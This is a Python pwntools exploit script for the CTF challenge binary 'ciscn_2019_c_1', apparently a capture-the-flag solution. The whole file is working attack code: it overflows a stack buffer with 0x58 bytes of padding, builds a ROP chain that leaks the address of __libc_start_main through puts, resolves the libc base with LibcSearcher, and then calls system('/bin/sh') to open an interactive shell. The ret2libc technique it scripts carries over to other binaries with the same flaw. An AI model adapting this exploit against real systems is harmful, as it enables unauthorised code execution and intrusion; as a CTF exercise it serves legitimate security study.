from pwn import *
from LibcSearcher import LibcSearcher

context(arch='amd64', os='linux', log_level='DEBUG')
p = process('./ciscn_2019_c_1')
elf = ELF('./ciscn_2019_c_1')

pop_rdi = 0x400c83

def ret2libc(leak, func):
	libc = LibcSearcher(func, leak)
	base = leak - libc.dump(func)
	system = base + libc.dump('system')
	binsh = base + libc.dump('str_bin_sh')
	return (system,binsh)

def send(payload):
	p.recvuntil('!\n')
	p.sendline('1')
	p.recvuntil('ed\n')
	p.sendline(payload)

payload = flat(['a'*0x58, pop_rdi, elf.got['__libc_start_main'], elf.plt['puts'], elf.sym['main']])
send(payload)

p.recvuntil('@\n')
leak = u64(p.recv(6).ljust(8,'\x00'))
system,binsh = ret2libc(leak, '__libc_start_main')

payload = flat(['a'*0x58, pop_rdi, binsh, system])
send(payload)

p.interactive()